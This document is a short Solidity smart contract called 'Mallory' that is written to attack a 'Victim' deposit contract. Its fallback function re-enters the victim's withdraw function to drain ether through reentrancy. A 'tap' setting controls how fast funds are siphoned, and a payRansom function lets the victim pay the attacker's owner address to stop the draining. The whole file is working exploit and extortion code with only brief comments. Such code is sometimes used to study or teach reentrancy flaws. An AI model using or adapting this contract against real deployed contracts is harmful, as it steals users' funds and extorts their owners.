contract Mallory {
    Victim public depositFunds;
    address owner;
    uint tap;
    uint ransom;

    constructor(address _depositFundsAddress) {
        depositFunds = Victim(_depositFundsAddress);
        owner = msg.sender;
        tap = 99; // default arbitrary value to siphon everything when ransom is not payed
        ransom = 1 ether;
    }

    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
        if (address(depositFunds).balance >= 1 ether && tap == 99) {
            depositFunds.withdraw(msg.value);
        }
        else if (address(depositFunds).balance >= 1 ether && tap > 0) {
            tap = tap -1;
            depositFunds.withdraw(msg.value);
        }
    }

    function attack(uint _tap) external payable {
        // tap is used in the step 2) and 4) of the attack, to continue doing reentrancy but int small doses
        require(msg.value >= 1 ether);
        require(_tap <= msg.value);

        tap = _tap;

        depositFunds.deposit{value: msg.value}();
        depositFunds.withdraw(msg.value);
    }

    function payRansom() external payable {
        // The victim pays the ransom and the contract gets destroyed
        require(msg.value >= ransom);
        selfdestruct(payable(owner));
    }

    function setRansom(uint _ransom) external {
        require(msg.sender == owner);
        ransom = _ransom;
    }
}

